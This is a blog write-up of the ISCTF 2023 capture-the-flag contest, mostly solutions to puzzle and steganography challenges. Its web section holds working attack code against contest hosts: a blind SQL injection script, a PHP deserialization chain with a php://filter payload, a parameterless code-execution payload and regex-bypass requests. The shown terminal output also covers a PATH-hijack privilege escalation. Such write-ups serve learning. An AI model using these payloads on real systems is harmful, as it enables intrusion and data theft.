---
title: '2023 ISCTF Writeup'
description: '伪加密解密拿到 png 和 flag.txt'
pubDate: 2023-12-01
author: 'IHK-1'
tags: ['CTF', 'ISCTF', '2023']
---

# MISC
## 小蓝鲨的秘密
伪加密解密拿到 png 和 flag.txt

对 PNG 进行 宽高修复 拿到 key

```plain
15CTF2023
U2FsdGVkX1/ij5Hxtt6G8tDvbXIQcMLJ6isLpLmxqxW8mOmFIB4DgBGXSR3ceEcj

AES 解密
ISCTF{2832-3910-232-3742-7320}
```

## easy_zip
压缩包爆破 key: 234762

```plain
ISCTF{0f268ebb-58cf-4e29-ab7d-b4ac405ace28}
```

## PNG的基本食用
part1.png 宽高修复

```plain
ISCTF{png-is-
```

part2.png LSB

```plain
so-ez-
```

part3.png 文件末尾

```plain
for-you}
```

## 你说你爱我？尊嘟假嘟？
```plain
你说爱我 -> .
尊嘟	-> !
假嘟	-> ?
```

```plain
....................!?!!.?....................?.?!.?..........!.......!.!!!!!!!!!!!!!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!.?...............!?!!.?..............?.?!.?................!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......................!.?.........!?!!.?!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!.?.......!?!!.?......?.?!.?........!...........!.?.......!?!!.?......?.?!.?........!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!.?.........!?!!.?........?.?!.?......!.?...........!?!!.?!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.?.............!?!!.?............?.?!.?..........!.?...........!?!!.?!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!!!.?.......!?!!.?......?.?!.?..........!.?...........!?!!.?..........?.?!.?..................!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......................!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!.?...........!?!!.?..........?.?!.?!.?.........!?!!.?........?.?!.?..............!.?.........!?!!.?!!!!!!!!?.?!.?!!!!!!!!!!!!!.?.........!?!!.?!!!!!!!!?.?!.?!!!!!.?.........!?!!.?........?.?!.?....!.?.........!?!!.?!!!!!!!!?.?!.?!.?...........!?!!.?..........?.?!.?............!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!.?...........!?!!.?..........?.?!.?!.?...........!?!!.?!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.....!.?.........!?!!.?........?.?!.?!.?...........!?!!.?..........?.?!.?..........!.?...........!?!!.?!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!.?...........!?!!.?!!!!!!!!!!?.?!.?!!!!!!!!!!!!!.?.............!?!!.?............?.?!.?..........!.?.
```

```plain
ild3l4pXejwPcCwJsPAOq7sJczdRdTsJcCEUsP1Z

From_Base64('0-9a-zA-Z+/=',true,false)
ISCTF{9832h-s92hw-23u7w-2j8s0}
```

## 杰伦可是流量明星
以压缩包打开文件，有一个 login.html，对登入的 POST 传参分析

```plain
hidIp=39.152.148.33&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTY1NTY2MzgxNWRkWAq555e9iDG+5JKbbOxit8zBuY5d6CI9jHnklQBKQEA=&__EVENTVALIDATION=/wEWCAK1/6XMBQKl1bKzCQLG8eCkDwLRxcX7CwKN5NzNBgKWrsS6AwLB6b6zDAL6o4PRA7ey86C9MAJ3Zk7GyZhLO5J6D/aRhdsEFzo1tJubInf2&txtUserName=admin&txtUserPwd=flag{wddhr836459_83}&rdoSelect=teacher&btnLogin1= µÇ Â¼ &hidLogin=

flag{wddhr836459_83}
```

## Ez_misc
第五张 ppt 备注

```plain
M13c_!ps2s23
```

修复文件头

<!-- 这是一张图片，ocr 内容为： -->


```plain
flag{5e093f8a-6b8c-4fa5-b9f7-0ae3b6b0da56}
```

## 蓝鲨的福利
修复文件头

```plain
ISCTF{blueshark_welcome_you}
```

## 张万森，下雪了
字典爆破

```plain
blueSHARK666
```

字频统计 ISCTF2023 ，使用key 对 SNOW 隐写解密拿到 flag

```plain
ISCTF{34da-a87s-sk87-s384-3982-398233}
```

## 镜流
压缩包爆破 key: 306256，对图像进行 提取像素

```python
from PIL import Image

img = Image.open('1new.png')
start_pos = (0, 0)
size = 10

out = Image.new('RGB', (img.size[0] // size, img.size[1] // size), "white")
for y in range(img.size[1] // size):
    for x in range(img.size[0] // size):
        pixel = img.getpixel((start_pos[0] + x * size, start_pos[1] + y * size))
        out.putpixel((x, y), pixel)

out.save('out.png')
```

<!-- 这是一张图片，ocr 内容为： -->


对 LSB bin 提取

<!-- 这是一张图片，ocr 内容为：I SC TFFJINGLIU IS _ SO.COOL3 -->


```python
ISCTF{JINGLIU_IS_SO_COOL}
```

## spalshes
```plain
MSwyLjc1LDEsMSwyLjUsMSwxLDIuMjUsMSwxLDEuNzUsMSwxLDIsMSwxLDMsMSwxLjUsMywxLDIsMywxLDIsMi43NSwxLDIsMi41LDEsMiwyLjI1LDEsMiwyLDEsMiwxLjc1LDEsMiwxLjUsMSwxLDIuMjUsMSwxLjUsMi4yNSwxLDEsMS41LDEsMS41LDEuNSwxLA0KNCwyLjc1LDEsNCwyLjUsMSwzLDMsMSwzLjUsMywxLDQsMywxLDMuNSwyLjI1LDEsNCwyLjI1LDEsNCwyLDEsNCwxLjc1LDEsNCwxLjUsMSwzLDEuNSwxLDMuNSwxLjUsMSwzLDIuMjUsMSwzLDIuNSwxLDMsMi43NSwxLA0KNSwzLDEsNS41LDMsMSw2LDMsMSw2LDIuMjUsMSw2LDIsMSw2LDEuNzUsMSw2LDEuNSwxLDUuNSwxLjUsMSw1LDEuNSwxLDUsMi4yNSwxLDUuNSwyLjI1LDEsNSwyLjUsMSw1LDIuNzUsMSwNCjcsMywxLDcuNSwzLDEsOCwzLDEsOCwyLjUsMSw4LDIsMSw4LDEuNSwxLDgsMi43NSwxLDgsMi4yNSwxLDgsMS43NSwxLA0KOSwzLDEsOS41LDMsMSwxMCwzLDEsMTAsMi43NSwxLDEwLDIuNSwxLDEwLDIuMjUsMSw5LjUsMi4yNSwxLDksMi4yNSwxLDksMS41LDEsOS41LDEuNSwxLDEwLDEuNSwxLDEwLDIsMSwxMCwxLjc1LDEsDQoxMS41LDMsMSwxMiwzLDEsMTEsMywxLDEyLDIuMjUsMSwxMiwyLDEsMTIsMS43NSwxLDEyLDEuNSwxLDExLjUsMS41LDEsMTEsMS41LDEsMTEsMS43NSwxLDExLDIsMSwxMSwyLjI1LDEsMTEsMi41LDEsMTEsMi43NSwxLDExLjUsMi4yNSwx

from base64
1,2.75,1,1,2.5,1,1,2.25,1,1,1.75,1,1,2,1,1,3,1,1.5,3,1,2,3,1,2,2.75,1,2,2.5,1,2,2.25,1,2,2,1,2,1.75,1,2,1.5,1,1,2.25,1,1.5,2.25,1,1,1.5,1,1.5,1.5,1,
4,2.75,1,4,2.5,1,3,3,1,3.5,3,1,4,3,1,3.5,2.25,1,4,2.25,1,4,2,1,4,1.75,1,4,1.5,1,3,1.5,1,3.5,1.5,1,3,2.25,1,3,2.5,1,3,2.75,1,
5,3,1,5.5,3,1,6,3,1,6,2.25,1,6,2,1,6,1.75,1,6,1.5,1,5.5,1.5,1,5,1.5,1,5,2.25,1,5.5,2.25,1,5,2.5,1,5,2.75,1,
7,3,1,7.5,3,1,8,3,1,8,2.5,1,8,2,1,8,1.5,1,8,2.75,1,8,2.25,1,8,1.75,1,
9,3,1,9.5,3,1,10,3,1,10,2.75,1,10,2.5,1,10,2.25,1,9.5,2.25,1,9,2.25,1,9,1.5,1,9.5,1.5,1,10,1.5,1,10,2,1,10,1.75,1,
11.5,3,1,12,3,1,11,3,1,12,2.25,1,12,2,1,12,1.75,1,12,1.5,1,11.5,1.5,1,11,1.5,1,11,1.75,1,11,2,1,11,2.25,1,11,2.5,1,11,2.75,1,11.5,2.25,1
```

发现为 3 的倍数，对第二位 为 x 第一位 y 第三位为像素值

```python
from PIL import Image

data = '''1,2.75,1,1,2.5,1,1,2.25,1,1,1.75,1,1,2,1,1,3,1,1.5,3,1,2,3,1,2,2.75,1,2,2.5,1,2,2.25,1,2,2,1,2,1.75,1,2,1.5,1,1,2.25,1,1.5,2.25,1,1,1.5,1,1.5,1.5,1,
4,2.75,1,4,2.5,1,3,3,1,3.5,3,1,4,3,1,3.5,2.25,1,4,2.25,1,4,2,1,4,1.75,1,4,1.5,1,3,1.5,1,3.5,1.5,1,3,2.25,1,3,2.5,1,3,2.75,1,
5,3,1,5.5,3,1,6,3,1,6,2.25,1,6,2,1,6,1.75,1,6,1.5,1,5.5,1.5,1,5,1.5,1,5,2.25,1,5.5,2.25,1,5,2.5,1,5,2.75,1,
7,3,1,7.5,3,1,8,3,1,8,2.5,1,8,2,1,8,1.5,1,8,2.75,1,8,2.25,1,8,1.75,1,
9,3,1,9.5,3,1,10,3,1,10,2.75,1,10,2.5,1,10,2.25,1,9.5,2.25,1,9,2.25,1,9,1.5,1,9.5,1.5,1,10,1.5,1,10,2,1,10,1.75,1,
11.5,3,1,12,3,1,11,3,1,12,2.25,1,12,2,1,12,1.75,1,12,1.5,1,11.5,1.5,1,11,1.5,1,11,1.75,1,11,2,1,11,2.25,1,11,2.5,1,11,2.75,1,11.5,2.25,1'''.replace(
    '\n', '').split(',')


def cobvert(num):
    return int(float(num) / 0.25)


out = Image.new("L", (100, 100), "white")

data = list(map(cobvert, data))
for i in range(0, len(data), 3):
    print(data[i], data[i + 1], data[2])
    out.putpixel((data[i+1], data[i ]), data[2])

out.show()
```

<!-- 这是一张图片，ocr 内容为：155736 -->


得到 895736 解压后二维码解码拿到 flag

## 小猫
对 end3.png 文件末尾内容进行分离，拿到一张 jpg

<!-- 这是一张图片，ocr 内容为：遇事冷静 脸小三分 1)(3.1)(4.1)(2.2)(4.1)(1)(1.2)(4.1) 8)(3.2)(1.2)(4.1)(1,1)(4,1)(3,1)(3,1) 1)(2.3)(4.1)(4.2)(4.1)(3.2)(4.1) 2)(3.2)(1.2)(3.2)(3,1)(3,2)(3,2) 1)(4.2)(4.1)(3.2)(4.1)(3.2)(4.2) 吾皇 -->


替换成社会主义核心价值观密码

```plain
公正公正公正诚信文明公正民主
 
公正法治法治诚信民主公正民主
 
公正和谐公正民主和谐民主和谐
 
敬业和谐平等公正公正公正自由
 
和谐和谐公正自由和谐富强公正
 
公正和谐文明和谐和谐和谐敬业
 
和谐文明和谐平等和谐自由和谐
 
爱国公正自由和谐富强和谐文明
 
和谐敬业和谐法治和谐公正和谐
 
法治公正自由公正文明公正公正
 
和谐法治和谐公正和谐公正法治
 
友善法治
```

```python
flag{aca195fd3d0f2392548d029767dbf766}
```

## stream
SQL注入靶场

```plain
ISCTF{0ops!-Y0u-F1nd-Th3-S3cret-flag!!!}
```

## 小白小黑
```python
# 非预期： 
# 将每一个数字余2，构成一个二进制画出二维码
out = ''
lines = open('./flag.txt').readlines()
for line in lines:
    line = line.strip()

    for num in line:
        num = int(num)
        out += str(num%2)

print(out)
```

<!-- 这是一张图片，ocr 内容为： -->


```python
# 已经有二维码雏形，其中上面部分必然是白色边框的
# 统计了两行，发现两行总为 0，1，2，3，9 中的一个
# 尝试直接过滤，再将二进制转为二维码
# white_list = [0,1,2,3,9]

out = ''
lines = open('./flag.txt').readlines()
for line in lines:
    line = line.strip()

    for num in line:
        num = int(num)

        if num in [0,1,2,9,3]:
            out += '0'
        else:
            out += '1'

print(out)
```

<!-- 这是一张图片，ocr 内容为： -->


```plain
ISCTF{99517406-0378-4ba0-a873-70f245d6ca19}
```

## ezUSB
```plain
# 过滤出两种流量
# F:\WEB\Wireshark\tshark.exe -r C:\Users\HK\Desktop\usb.pcapng -T fields -Y 'usb.src == "2.4.2" && frame.cap_len == 46 && usb.irp_info == 0x01' -e btatt.value > C:\Users\HK\Desktop\usb.txt
# F:\WEB\Wireshark\tshark.exe -r C:\Users\HK\Desktop\usb.pcapng -T fields -Y 'frame.len == 64 && usb.bInterfaceClass == 0x03' -e usbhid.data > C:\Users\HK\Desktop\usb.txt
```

```python
normalKeys = {"04": "a", "05": "b", "06": "c", "07": "d", "08": "e", "09": "f", "0a": "g", "0b": "h", "0c": "i",
              "0d": "j", "0e": "k", "0f": "l", "10": "m", "11": "n", "12": "o", "13": "p", "14": "q", "15": "r",
              "16": "s", "17": "t", "18": "u", "19": "v", "1a": "w", "1b": "x", "1c": "y", "1d": "z", "1e": "1",
              "1f": "2", "20": "3", "21": "4", "22": "5", "23": "6", "24": "7", "25": "8", "26": "9", "27": "0",
              "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>", "2d": "-", "2e": "=", "2f": "[",
              "30": "]", "31": "\\", "32": "<NON>", "33": ";", "34": "'", "35": "<GA>", "36": ",", "37": ".", "38": "/",
              "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",
              "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
shiftKeys = {"04": "A", "05": "B", "06": "C", "07": "D", "08": "E", "09": "F", "0a": "G", "0b": "H", "0c": "I",
             "0d": "J", "0e": "K", "0f": "L", "10": "M", "11": "N", "12": "O", "13": "P", "14": "Q", "15": "R",
             "16": "S", "17": "T", "18": "U", "19": "V", "1a": "W", "1b": "X", "1c": "Y", "1d": "Z", "1e": "!",
             "1f": "@", "20": "#", "21": "$", "22": "%", "23": "^", "24": "&", "25": "*", "26": "(", "27": ")",
             "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "\t", "2c": "<SPACE>", "2d": "_", "2e": "+", "2f": "{",
             "30": "}", "31": "|", "32": "<NON>", "33": "\"", "34": ":", "35": "<GA>", "36": "<", "37": ">", "38": "?",
             "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",
             "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}

out = ''
lines = open('./usb.txt', encoding='utf-8').readlines()
for line in lines:
    line = line.strip()

    # check = line[0:2]
    # key = line[4:6]
    
    check = line[2:4]
    key = line[6:8]

    if check == '02':
        try:
            out += normalKeys[key]
        except:
            pass
    else:
        try:
            out += shiftKeys[key]
        except:
            pass

    print(check,key)

print(out)
```

```plain
<CAP>aggsz{k<CAP>p_wn_<CAP>yrv
<CAP>_so<DEL><DEL>sov_je<DEL>mzus<DEL><DEL><DEL>fyffjs!!b<DEL>!}

# 转换字符
AGGSZ{Kp_wn_YRV_sov_jmfyffjs!!!}

# 对应开头 AGGSZ 对应 ISCTF 反推key：soezusb
ISCTF{So_ez_USB_and_vigenere!!!}
```

## 一心不可二用
在 apk 内确定了 版本 2.2.2 ，下载原版进行对比

```python
import zipfile

zip_a = zipfile.ZipFile("Daddy_Was_A_Thief.apk")
zip_b = zipfile.ZipFile("Daddy Was A Thief_2.2.2_apkcombo.com.apk")

for file in zip_a.namelist():
    if file not in zip_b.namelist():
        print(file)

# res/drawable/flag.zip
```

对压缩包注释分析，正确的 错误码

```python
# 压缩包注释中的报错信息
File "script.py", line 2
TabError: unexpected EOF while parsing
Exited with error status 1

# 正确的报错信息
synTaxError: unexpected EOF while parsing

# 压缩包密synTaxError码
SyntaxError

flag{Err0R_is_no7_ex1ste9}
```

## EZcrc
```python
import zipfile
import itertools
import binascii
from collections import Counter


zipf = zipfile.ZipFile('./flag.zip')
zipf_len = len(zipf.namelist())
word_list = range(256) # 字符集为0x00~0xff，试过可见字符，爆不出

crc_dist = {}
crc_list = []

for i in range(zipf_len):
    file_name = f'{i}.txt'
    file_crc = zipf.getinfo(file_name).CRC
    crc_list.append(file_crc)

crc_list = Counter(crc_list).keys()
for crc in crc_list:
    byte_list = itertools.product(word_list, repeat=3)

    for byte in byte_list:
        data = bytes(byte)
        if binascii.crc32(data) == crc:
            crc_dist[str(crc)] = data

out = b''
for i in range(zipf_len):
    file_name = f'{i}.txt'
    file_crc = zipf.getinfo(file_name).CRC
    out += crc_dist[str(file_crc)]

with open('output', 'wb') as f:
    f.write(out)

# '大写的乌壹大写的资大写的喔大写的日大写的佛大写的资大写的佛大写的巫基得大写的讷啊勒大写的乌歪大写的特大写的巫壹大写的巫啊大写的乌玖大写的希大写的乌大写的希大写的日大写的资啊科伍日大写的特大写的巫科巫大写的摸大写的鹅壹欺大写的欺摸喝大写的摸大写的迂零科零大写的特讷坡日得大写的佛勒大写的希大写的日摸壹啊玻大写的迂大写的鹅歪大写的特勒大写的日大写的基大写的讷大写的鹅伍大写的乌大写的歪叁坡摸大写的乌大写的特零玖'

```

```python
import base64

dict = {
    '玻': 'B',
    '坡': 'P',
    '摸': 'M',
    '佛': 'F',
    '得': 'D',
    '特': 'T',
    '讷': 'N',
    '勒': 'L',

    '哥': 'G',
    '科': 'K',
    '喝': 'H',
    '基': 'J',
    '欺': 'Q',
    '希': 'X',

    '日': 'R',
    '资': 'Z',
    '雌': 'C',
    '思': 'S',
    '医': 'Y', 
    '巫': 'W',

    '啊': 'A',
    '喔': 'O', 
    '鹅': 'E',
    '衣': 'I',
    '乌': 'U',
    '迂': 'V',
    '歪': 'Y', 

    '零': '0',
    '壹': '1',
    '叁': '3',
    '伍': '5',
    '陆': '6',
    '玖': '9',
}
string = '大写的乌壹大写的资大写的喔大写的日大写的佛大写的资大写的佛大写的巫基得大写的讷啊勒大写的乌歪大写的特大写的巫壹大写的巫啊大写的乌玖大写的希大写的乌大写的希大写的日大写的资啊科伍日大写的特大写的巫科巫大写的摸大写的鹅壹欺大写的欺摸喝大写的摸大写的迂零科零大写的特讷坡日得大写的佛勒大写的希大写的日摸壹啊玻大写的迂大写的鹅歪大写的特勒大写的日大写的基大写的讷大写的鹅伍大写的乌大写的歪叁坡摸大写的乌大写的特零玖'
out = string.split('大写的')[1:]

output = ''
for item in out:
    output += dict[item[0]]
    for word in item[1:]:
        output += dict[word].lower()
print(base64.b64decode(base64.b64decode(output)).decode())

# ISCTF{2562eb9d-b3d2-420a-b879-aaffd6528573}
```

## sudopy
sudo -l 查看发现有个 web.py 

直接进行编辑即可

<!-- 这是一张图片，ocr 内容为：VIMWEB.PY CTFQ81D62C272223: CTF@81D62C272223: CAT WEB.PY IMPORT OS OS.SYSTEM('CAT /HOME/CTF/FLAG') ~$ SUDO PYTHON3 /HOME/CTF/WEB.PY CTFA81D62C272223:~$ OPNS ISCTF{3DCE9F15-7D7B-475C-88CA-3BF71AA30995] -->


## DISK（×）
对 LogFile 分析 ，将每个文件 解码拼接拿到 flag

<!-- 这是一张图片，ocr 内容为：MINE V7.8.0.38310-AX1OM -DEC 02 2024 155036 MAGNET AXIOM EXAMINE V7. 文件(8/月)工具 进程帮助(&H) 亮收 日期和时间 配置文件 证据 部分结果 关键字列表" 使用方途 标签和备注 过波器 内容类型 证据(18) 列视图 使用方迹 RENAME 标签,备注和配置文件 当前.... 原始MFT 物改.... 原始...: 原始父级M..... 原始访问日期/.. 当前 原始创社日期/.. 当前文件名 所有证据 DISK.VHD 33 2023/10/2393658.079 1407374883553285 2023/10/2393658.079 2023/10/23 93658079 2023/10/23 93658 SSECUNE 精炼信息 3 详情 3 1407374803553205 2023/10/2393700.861 标识将-设备 2023/ 447 媒体 使用应该后品 1407374883553285 2023/10/23937:01394 2023/ 塑园 文件接作 1918846768.TOTT 超胎:LSN 2023/10/23 937:01910 2023/10/23 937:01.909 2023/ MAQALNXA.TOT 文档 原始文件名 811884366.BDT 2023/ 操作系统 19 原始MFT 修改日期用时间 2023/10/239:36:58.079 GOOG MWWBO91C.BXT 2023/10/2393702416 2023/ 2023/10/23 93702.416 2023/10/2393702416 2023/10/23907.02416 原始创建日期/时间 2023// 1413895007.0T 18 图 SLOGFILE分析 原始修故口照时有 2023/10/23936:58.079 2023/ 2023/10/23937:02926 原始访问日期/时间 2023/10/23 93658.079 1290230000 1.T 2023/ 原始父级 MFT 记是编号 2023/ 2023/10/23 937:03.433 AEGZFVWD.TXT 1407374883553285 原始父级 MFT 专用 2023/ 当前文件名 $SECURE 2023/10/239.37.03.947 0000 2023/10/23 936:58.079 简的MFT 带放日照/时间 NOTHING ABOUT FLAG 2023/ 当前创建目期/时间 2023/10/23 9:36-58.079 SRECYCLE.BIN 当前修改日期/时间 2023/10/23 9:36:58.079 2023/10/23 93658.079 前新访问日期/时间 当前父爱MFT记录编号 当前父级 MFT 参考号  1407374883553285 类型 SLOGFILE 分析 项目ID 证据信奥 DISK.VHD . PARTITION 1 (MICROSOFT NTFS,28 MB) ISCTF VSLOGFILE 饮气方法 已解析 已用除膜 位置 时区 UTC+000 -->


```plain
==QfnFGb
==gZfVWd
==gcU9Fd
==wbO91c
==QafNXa
==AaUtnR
==AVDNVS

ISCTF{This_is_Not_True_flag}
```

对文件 NOTHING ABOUT FLAG

## Wonderful New World
```plain
ISCTF{WELCOME_TO_MC_WORLD_IN_ISCTF}
```

## status
SUID 提权

<!-- 这是一张图片，ocr 内容为：CTF@22A5254673F5:~S FIND / -TYP -TYPE F -PERM-USS 2>/DEV/NULL /USR/LIB/OPENSSH/SSH-KEYSIGN /USR/LIB/DBUS-1.0/DBUS-DAEMON-LAUNCH-HELPER /HOME/CTF/CHECKGENSHIN  CTF@2A5254673F5:~$ -->


分析 <!-- 这是一张图片，ocr 内容为：IDA - CHECKGENSHIN C\USERS\HK\DESKTOP\CHECKGENSHIN 编辑跳转搜索视图调试器LUMINA 窗口帮助BINDIFF 文件 选项 X 中 无调试器 A 数据 指令 外部符号 常规函数 库函数 未知 LUMINA 函数 PSEUDOCODE-A 团 IDA VIEW-A 口GX FUNCTIONS 1 INT CDECL MAIN(INT ARGC, CONST CHAR **ARGV, CONST CHAR **ENVP) 函数名称 段 2 3 SETUID(O); INIT PROC INIT SUB_1020 4 SETGID(O); PLT 5 PRINTF("STATUS OF THE SSH SERVER:"); PLT SYSTEN SYSTEM("SERVICE SSH STATUS"); PRINTF P1T P1T SETGID RETURN 0; P1T 8 SETUID CXA FINALIZE PLT.GOT TEXT START DEREGISTER TM CLONES TEXT TEXT REGISTER TM_CLONES DO GLOBAL DTORS AUX TEXT FRAME_DUMMY TEXT TEXT LIBE_CSU_INIT TEXT LIBE_ESU FINI TEXT FINI TERM PROC EXTERN SYSTEM PRINTF EXTERN LIBESTART EXTERN EXTERN SETGID SETUID EXTERN _CXA_FINALIZE EXTERN 11P .GMON_START EXTERN -->


尝试劫持 service

<!-- 这是一张图片，ocr 内容为：/TMP CTF@672457BEDCBA: CD TMP /HOME/CTF/FLAG > /TMP/FLAG' CTF@672457BEDCBA: CAT ECHO STATUS CTF@672457BEDCBA://TMPS CHMOD+X STATUS CTF@672457BEDCBA://TMP$ EXPORT PATH:/TMP:$PATH /HOME/CTF/CHECKGENSHIN CTF@672457BEDCBA://TMPS *SSHD IS RUNNING STATUS OF THE SSH SERVER:CTFE672457BEDCBA://TMPS /HOME/CTF/CHECKGENSHIN SSHD IS RUNNING STATUS OF THE SSH SERVER:CTF@672457BEDCBA://TMPS STATUS CAT: /HOME/CTF/FLAG: PERMISSION DENIED /HOME/CTF/FLAG > /TMP/FLAG' > SERVICE ECHO CAT /H CTF@672457BEDCBA://TMP$ MPS CHMOD CTF@672457BEDCBA://TMPS +X STAT FILE OR DIRECTORY CHMOD: CANNOT ACCESS STAT' SUCH ON CHMOD CTF@672457BEDCBA://TMPS +X SERVICE /HOME/CTF/CHECK CTF@672457BEDCBA://TMPS MPS JENSHIN /TMP/FLAG PERMISSION DENIED /TMP/SERVICE:1: CANNOT CREATE STATUS OF THE SSH SERVER:CTF@672457BEDCBA://TMP$ S ECHO 'CAT /HOME/CTF/FLAG' > SERVICE CTF@672457BEDCBA://TMPS /HOME/CTF/CHECKGER GENSHIN ISCTF{4FCE0D0A-B676-4878-91BD-62636FC940F5> S OF THE SSH SERVER:CTF@672457BEDCBA:/TMPS VC STATUS OF CTF@672457BEDCBA://TMPS -->


# WEB
## 绕进你的心里
<!-- 这是一张图片，ocr 内容为：<?PHP  HIGHLIGHT_FILE(_FILE_ ERROR_REPORTING(0) REQUIRE 'FLAG.PHP' $STR   (STRING)$_POST[ PAN_GU $NUM  - $_GET['ZHURONG' $_GET['HONGMENG' $LIDA1 $ GET $1IDA2 SHANNONG MD5($1IDA2)) $1IDA2 F($LIDAL &BE 三三三 MD5($1IDA1) MCL5死边 ECHO $NUMY) { IF(PREG_MATCH("/[0-9]/ DIE(你干嘛?哎哟!"); ELSEIF(INTVAL($NUM)){ (PREG_MATCH(/.+?ISCTF/IS', $STR) DIE("再想想!"); 2023ISCTF') IF(STRIPOS($STR, FALSE) DIE("就差一点点啦!"); $F1AG: ECHO ?>MD5绕过了!再想想! -->


数组绕过 + 数组绕过 + 回溯次数绕过

```python
import requests

url = 'http://gz.imxbt.cn:20541/?hongmeng[]=1&shennong[]=2&zhurong[]=a'
data = {"pan_gu": "a" * 1000000 + "2023ISCTF"}

response = requests.post(url, data=data).text
print(response)
```

## 圣杯战争!!!
反序列化链子

```plain
summon::__wakeup --> artifact::__toString --> prepare::__get --> saber::__invoke
```

```php
<?php

  class artifact{
  public $excalibuer;
  }

  class prepare{
    public $release;
}
class saber{
  public $weapon;
}

class summon{
  public $Saber;

}

$a = new saber();
$a -> weapon = "pHp://FilTer/convert.base64-encode/resource=flag.php";

$b = new prepare();
$b -> release = $a;

$c = new artifact();
$c ->excalibuer=$b;

$d = new summon();
$d -> Saber = $c;

echo serialize($d);
```

## Where is the flag
蚁剑链接后

```plain
flag.php
FLAG1:ISCTF{Y0u_6u

/flag
FLAG2:cceeded_in_f

env
FLAG3=ind1n9_f1ag}

env
ISCTF{31cabf47-cb2a-400f-af07-9bece14f2c5e}
```

## wafr
无参数进行绕过

```php
readfile(scandir(chr(46))[2])
```

## webinclude
扫到 web 备份文件 /index.bak

```python
def textToarray(hash):
    array =[]
    for c in hash:
        code = ord(c)
        array.append(code-97)
    return array


def arrayTostring(array):
    string=''
    for i in range(0,len(array),2) :
        string+= chr(array[i]*26+array[i+1])
    return string

print (arrayTostring((textToarray((arrayTostring((textToarray(hash))))))))
# mihoyo
```

进行文件包含传参即可

## 1z_sql
访问路径 /robots.txt

```php
<?php
  highlight_file("here_is_a_sercet.php");

function waf($str){
  $black_list = "762V08zk+xrmKxIFrdJIJj6ULvI8Lc0pX39LjDyIUb0eAGkZe4KQa87TJXuqnFw0u/669wWRsqYFya812FtULw9+tpiGlaH2gleDfDKzr+g=";
  if (preg_match($black_list,$str)){
    die("<h4>illegal words!</h4>");
  }
  return $str;
}

?>
```

对 SQL 部测试

<!-- 这是一张图片，ocr 内容为：过意:显示所有条目 接收到响应 长度 错误 请求 超时 状态码 PAYLOAD 3107 153333 INFORMATION_SCHEMA 200 06840005% 3107 200 SLEEP 3107 200 BENCHMARK 3107 200 200 3107 3108 200 WHERE 3108 200 LIKE -->


```plain
WAF

information_schema
sleep
benchmark
+
=
where
union
like
```

```python
import requests

url = "http://gz.imxbt.cn:20569/"

output = "[+]Found: "
for pos in range(1, 50):
    for num in range(129):
        data = {
            "username": f"admin' and ascii(substr((select database()),{pos},1))<{num} #",
            "password": "1",
            "submit":"登录"
        }

        response = requests.post(url, data=data).text
        # print(response)

        if "You are so smart!" in response:
            output += chr(num - 1)
            break

    print(output)

# select database() bthcls
```

```python
import requests

url = "http://gz.imxbt.cn:20569/"
databases = {}

for table_name in open(r"password", 'r').readlines():
    for column_name in open(r"password", 'r').readlines():
        table_name = table_name.strip()
        column_name = column_name.strip()

        data = {
            "username": f"admin' and ascii(substr((select group_concat({column_name}) FROM bthcls.{table_name}),1,1))>1 #",
            "password": "1",
            "submit": "登录"
        }

        response = requests.post(url, data=data).text
        # print(response)

        if "You are so smart!" in response:
            print(table_name, column_name)
users user
users password
```

盲注1 password 即可



